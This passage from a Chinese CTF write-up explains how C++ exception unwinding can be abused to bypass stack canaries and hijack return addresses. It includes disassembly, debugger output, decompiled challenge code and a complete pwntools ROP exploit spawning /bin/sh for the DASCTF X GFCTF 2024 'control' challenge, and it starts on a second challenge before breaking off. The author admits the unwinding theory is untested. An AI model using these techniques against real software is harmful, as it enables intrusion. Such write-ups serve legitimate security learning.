test_func2(void)</span><br><span class="line">.text:00000000000012A3                 public _Z10test_func2v</span><br><span class="line">.text:00000000000012A3 _Z10test_func2v proc near               ; CODE XREF: test_func1(void)+38↓p</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 var_14          = dword ptr -14h</span><br><span class="line">.text:00000000000012A3 var_8           = qword ptr -8</span><br><span class="line">.text:00000000000012A3</span><br><span class="line">.text:00000000000012A3 ; __unwind &#123; // __gxx_personality_v0</span><br><span class="line">.text:00000000000012A3                 endbr64</span><br><span class="line">.text:00000000000012A7                 push    rbp</span><br><span class="line">.text:00000000000012A8                 mov     rbp, rsp</span><br><span class="line">.text:00000000000012AB                 push    rbx</span><br><span class="line">.text:00000000000012AC                 sub     rsp, 18h</span><br><span class="line">.text:00000000000012B0                 lea     rax, aTestFunc2 ; &quot;test func2&quot;</span><br><span class="line">.text:00000000000012B7                 mov     rsi, rax</span><br><span class="line">.text:00000000000012BA                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:00000000000012C1                 mov     rdi, rax</span><br><span class="line">.text:00000000000012C4                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:00000000000012C9                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:00000000000012D0                 mov     rsi, rdx</span><br><span class="line">.text:00000000000012D3                 mov     rdi, rax</span><br><span class="line">.text:00000000000012D6                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:00000000000012DB ;   try &#123;</span><br><span class="line">.text:00000000000012DB                 call    _Z10test_func3v ; test_func3(void)</span><br><span class="line">.text:00000000000012DB ;   &#125; // starts at 12DB</span><br><span class="line">.text:00000000000012E0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000000012E0</span><br><span class="line">.text:00000000000012E0 loc_12E0:                               ; CODE XREF: test_func2(void)+B9↓j</span><br><span class="line">.text:00000000000012E0                 lea     rax, aFunc2Exit ; &quot;func2 exit&quot;</span><br><span class="line">.text:00000000000012E7                 mov     rsi, rax</span><br><span class="line">.text:00000000000012EA                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:00000000000012F1                 mov     rdi, rax</span><br><span class="line">.text:00000000000012F4                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:00000000000012F9                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:0000000000001300                 mov     rsi, rdx</span><br><span class="line">.text:0000000000001303                 mov     rdi, rax</span><br><span class="line">.text:0000000000001306                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:000000000000130B                 jmp     short loc_1375</span><br><span class="line">.text:000000000000130D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000130D ;   catch(_ZTIi@CXXABI_1_3) // owned by 12DB</span><br><span class="line">.text:000000000000130D                 endbr64</span><br><span class="line">.text:0000000000001311                 cmp     rdx, 1</span><br><span class="line">.text:0000000000001315                 jz      short loc_131F</span><br><span class="line">.text:0000000000001317                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:000000000000131A                 call    __Unwind_Resume</span><br><span class="line">.text:000000000000131F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000131F</span><br><span class="line">.text:000000000000131F loc_131F:                               ; CODE XREF: test_func2(void)+72↑j</span><br><span class="line">.text:000000000000131F                 mov     rdi, rax        ; void *</span><br><span class="line">.text:0000000000001322                 call    ___cxa_begin_catch</span><br><span class="line">.text:0000000000001327                 mov     eax, [rax]</span><br><span class="line">.text:0000000000001329                 mov     [rbp+var_14], eax</span><br><span class="line">.text:000000000000132C                 lea     rax, aCatch2    ; &quot;catch 2&quot;</span><br><span class="line">.text:0000000000001333                 mov     rsi, rax</span><br><span class="line">.text:0000000000001336                 lea     rax, _ZSt4cout@GLIBCXX_3_4</span><br><span class="line">.text:000000000000133D                 mov     rdi, rax</span><br><span class="line">.text:0000000000001340 ;   try &#123;</span><br><span class="line">.text:0000000000001340                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(std::ostream &amp;,char const*)</span><br><span class="line">.text:0000000000001345                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr</span><br><span class="line">.text:000000000000134C                 mov     rsi, rdx</span><br><span class="line">.text:000000000000134F                 mov     rdi, rax</span><br><span class="line">.text:0000000000001352                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator&lt;&lt;(std::ostream &amp; (*)(std::ostream &amp;))</span><br><span class="line">.text:0000000000001352 ;   &#125; // starts at 1340</span><br><span class="line">.text:0000000000001357                 call    ___cxa_end_catch</span><br><span class="line">.text:000000000000135C                 jmp     short loc_12E0</span><br><span class="line">.text:000000000000135E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000000135E ;   cleanup() // owned by 1340</span><br><span class="line">.text:000000000000135E                 endbr64</span><br><span class="line">.text:0000000000001362                 mov     rbx, rax</span><br><span class="line">.text:0000000000001365                 call    ___cxa_end_catch</span><br><span class="line">.text:000000000000136A                 mov     rax, rbx</span><br><span class="line">.text:000000000000136D                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:0000000000001370                 call    __Unwind_Resume</span><br><span class="line">.text:0000000000001375 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001375</span><br><span class="line">.text:0000000000001375 loc_1375:                               ; CODE XREF: test_func2(void)+68↑j</span><br><span class="line">.text:0000000000001375                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:0000000000001379                 leave</span><br><span class="line">.text:000000000000137A                 retn</span><br><span class="line">.text:000000000000137A ; &#125; // starts at 12A3</span><br><span class="line">.text:000000000000137A _Z10test_func2v endp</span><br></pre></td></tr></table></figure><p>首先先断点在<code>.text:000000000000129E                 call    ___cxa_throw</code>上，即func3即将抛出异常的地方，可以看到此时func3的ret地址是func2正常退出的地址(func2+61)</p><p><img src="https://c-lby.top/images/cpp_exception/func3%E6%96%AD%E7%82%B9ret%E5%9C%B0%E5%9D%80%E6%AD%A3%E5%B8%B8.png" alt="func3断点ret地址正常"></p><p>如果此时直接步过<code>__cxa_throw</code>，程序直接就往后执行完退出了，说明所有问题都出在这个函数里。因此我们步进去看看会发生什么。</p><p>步进之后可以进一步发现问题出在<code>_Unwind_RaiseException</code>函数里。这个函数实在是过于复杂，我在2024GFCTF中的control那道题里找到了这个函数的汇编代码（因为他是静态编译的），从加载出来的符号表可以看出这个函数的主要作用是更改上下文。</p><p>从实际效果出发来说的话就是他把func3的返回地址从func2的正常退出改成了func2中的catch块。</p><p>这里我偷了个懒，我直接在0x130D处下了断点，也就是刚开始执行func2的catch块的地方，然后关注栈上func3栈帧的返回地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x7fffffffdb50</span></span><br><span class="line">00:0000│-030     0x7fffffffdb50 —▸ 0x7fffffffdb80 —▸ 0x7fffffffdba0 —▸ 0x7fffffffdbb0 ◂— 0x1</span><br><span class="line">01:0008│-028     0x7fffffffdb58 —▸ 0x55555555530d (test_func2()+106) ◂— endbr64</span><br><span class="line">02:0010│ rdi rsp 0x7fffffffdb60 —▸ 0x7fffffffdcc8 —▸ 0x7fffffffdf45 ◂— &#x27;/mnt/c/Users/31386/Desktop/tmp&#x27;</span><br><span class="line">03:0018│-018     0x7fffffffdb68 ◂— 0xd6e057b5651d2000</span><br><span class="line">04:0020│-010     0x7fffffffdb70 ◂— 0x0</span><br><span class="line">05:0028│-008     0x7fffffffdb78 ◂— 0x0</span><br><span class="line">06:0030│ rbp     0x7fffffffdb80 —▸ 0x7fffffffdba0 —▸ 0x7fffffffdbb0 ◂— 0x1</span><br><span class="line">07:0038│+008     0x7fffffffdb88 —▸ 0x5555555553b8 (test_func1()+61) ◂— lea rax, [rip + 0xc7a]</span><br></pre></td></tr></table></figure><p>很明显，func3的返回地址从<code>func2+61</code>变成了<code>func2+106</code>。这就给了我们一个启示：其实可以像正常rop一样劫持ret地址的。但是有一个疑问在于，明明throw往往会比栈溢出更先发生，那岂不是劫持好的ret地址又被修改了？事实上在一些情况下并不会发生，但是百思不得其解。迫不得已，去找找源码。<a href="https://blog.csdn.net/lidan113lidan/article/details/121865210">资料</a> <a href="https://github.com/gcc-mirror/gcc/blob/master/libgcc/unwind.inc">源码</a></p><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/unwind-dw2.c#L940">libc</a>里只能找到关于上下文设置的函数，没有<code>_Unwind_RaiseException</code>的，一番搜索之后发现他在gcc的源码里。这意味这什么？这意味这其实这部分处理早在编译的时候就已经做好预处理了，而非程序运行才来处理，是更底层的实现，比如像这个函数是怎么找到catch块的这样的问题。</p><p>结合上面两篇资料的分析（我想大概是基于LSDA的检查），加上我自己对源码的理解，应该可以得出一个结论：只要ret地址劫持的是catch块就可以绕过检查，直接break结束循环寻找catch的过程。经过实验发现只要是位于try和catch之间的地址都是合法的。<strong>因为资料里有太多看不懂的术语，不确定我的理解是否正确，所以这里只是我的想法，仅有少量实验，未经过严谨的推断，准确性有待商榷。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">     <span class="keyword">if</span> (fs.personality)</span><br><span class="line">&#123;</span><br><span class="line">  code = (*fs.personality) (<span class="number">1</span>, _UA_SEARCH_PHASE, exc-&gt;exception_class,</span><br><span class="line">    exc, &amp;cur_context);</span><br><span class="line">  <span class="keyword">if</span> (code == _URC_HANDLER_FOUND)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND)</span><br><span class="line">    <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这只是有关异常处理利用的其中一种方式而已，我见到更多的其实是利用它不执行后续代码来绕过canary然后打栈迁移的。</p><h3 id="DASCTF-X-GFCTF-2024-control"><a href="#DASCTF-X-GFCTF-2024-control" class="headerlink" title="DASCTF X GFCTF 2024  control"></a>DASCTF X GFCTF 2024  control</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r9d</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to control&quot;</span>, argv);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s answer some question&quot;</span>, argv);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;Gift&gt; &quot;</span>, (_DWORD)argv, v3, v4, v5, v6);</span><br><span class="line">  read(<span class="number">0LL</span>, &amp;gift, <span class="number">16LL</span>);</span><br><span class="line">  <span class="keyword">return</span> vuln(<span class="number">0LL</span>, (__int64)&amp;gift);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">vuln</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  _BYTE v4[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How much do you know about control?&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)read(<span class="number">0LL</span>, v4, <span class="number">0x100</span>LL) &gt; <span class="number">96</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    exception = _cxa_allocate_exception(<span class="number">8uLL</span>);</span><br><span class="line">    *exception = <span class="string">&quot;WRONGING! This answer is not suit&quot;</span>;</span><br><span class="line">    _cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">char</span> <span class="type">const</span>*, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序开头允许向bss段输入16个字节，然后在vuln函数中有cpp的异常处理函数，同时有0x30大小的栈溢出。可以看到当输入大于0x60的时候，就会触发异常处理。<strong>触发异常处理后，该函数后面的代码不再执行。</strong>所以就算破坏了canary程序也不一定会直接退出（之所以说不一定是因为有可能异常处理函数就是退出处理）。</p><p>看汇编会发现vuln函数里并没有catch，main函数中有catch，所以vuln函数中的栈溢出检查就不会被执行，会从main继续往下执行，main结束时会返回，所以只要劫持rbp到bss段上就可以进行rop了。</p><p>刚好一开始可以写16个字节，可以提前布置好binsh和ret地址，让main返回之后再次执行vuln函数。方便起见，可以直接劫持ret地址为read处，这样可以绕过栈初始化，就不用再动调看偏移了。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./control&quot;</span>)</span><br><span class="line">r = process(<span class="string">&quot;./control&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gift = <span class="number">0x4D3350</span></span><br><span class="line">vuln = <span class="number">0x402183</span></span><br><span class="line"></span><br><span class="line">payload = p64(gift) + p64(vuln)</span><br><span class="line">r.sendafter(<span class="string">b&quot;Gift&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64(gift)</span><br><span class="line">r.sendafter(<span class="string">b&quot;control?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x462c27</span></span><br><span class="line">pop_rdi = <span class="number">0x401c72</span></span><br><span class="line">pop_rsi = <span class="number">0x405285</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x495b8b</span></span><br><span class="line">syscall = <span class="number">0x40161e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">14</span></span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>  <span class="comment"># &lt;-- gift</span></span><br><span class="line">payload += p64(pop_rax)  <span class="comment"># &lt;-- ret地址</span></span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(gift)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_rbx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="2024羊城杯-logger"><a href="#2024羊城杯-logger" class="headerlink" title="2024羊城杯 logger"></a>2024羊城杯 logger</h3><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>这道题就要用到最开始分析的方法了，因为这道题是有后门的。</p><p>trace函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4015AB</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+26h] [rbp-Ah] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nYou can record log details here: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span> &amp;&amp; byte_404020[<span class="number">16</span> * i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_404020[<span class="number">16</span> * i + read(<span class="number">0</span>, &amp;byte_404020[<span class="number">16</span> * i], <span class="number">0x10</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Do you need to check the records? &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%1s&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)v4 == <span class="number">121</span> || (_BYTE)v4 == <span class="number">89</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span> &amp;&amp; byte_404020[<span class="number">16</span> * j] &amp;&amp; v3; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1B[31mRecord%d. %.16s\x1B[0m&quot;</span>, j + <span class="number">1</span>, &amp;byte_404020[<span class="number">16</span> * j]);</span><br><span class="line">        --v3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (_BYTE)v4 != <span class="number">110</span> &amp;&amp; (_BYTE)v4 != <span class="number">78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid input. Please enter &#x27;y&#x27; or &#x27;n&#x27;.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Records have been filled :(&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数允许我们写九次每次16个字节的数据，每次写入后会在末尾加一个截断符，写入的时候会检查该地址起始是否为\0。</p><p>warn函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_40178A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  _BYTE buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  _QWORD v5[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  _QWORD v6[<span class="number">5</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_401CA0(buf);</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  sub_4014FD(v5, <span class="number">32LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\x1B[1;31m%s\x1B[0m\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[!] Type your message here plz: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v0 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  HIBYTE(v3) = HIBYTE(v0);</span><br><span class="line">  buf[v0 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(byte_404200, buf, <span class="keyword">sizeof</span>(byte_404200));</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;dest[<span class="built_in">strlen</span>(dest)], <span class="string">&quot;: &quot;</span>);</span><br><span class="line">    <span class="built_in">strncat</span>(dest, byte_404200, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(dest);</span><br><span class="line">    exception = __cxa_allocate_exception(<span class="number">8uLL</span>);</span><br><span class="line">    *exception = src;</span><br><span class="line">    __cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">char</span> *, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(byte_404100, buf, <span class="keyword">sizeof</span>(byte_404100));</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  sub_4014FD(v6, <span class="number">32LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[User input log]\nMessage: %s\nDone at %s\n&quot;</span>, byte_404100, (<span class="type">const</span> <span class="type">char</span> *)v6);</span><br><span class="line">  sub_401CCA(buf);</span><br><span class="line">  <span class="keyword">return</span> v7 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有抛出异常的函数，如果输入字节的长度大于16字节就会抛出异常。查看汇编发现当前函数是没有catch块的，而调用链上最近的catch块在main函数（其实也是调用链上唯一一个）。异常抛出函数将src处（在data段）的字符当作exception传给catch，然后打印一串字符，接着继续执行main函数，因为main是无限循环的，所以不会退出。</p><p>同时可以发现这个程序其实不止一个catch块，并且在0x401BC7的catch执行了system，所以我们可以劫持ret地址到这个后门catch块。接下来考虑怎么传参就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 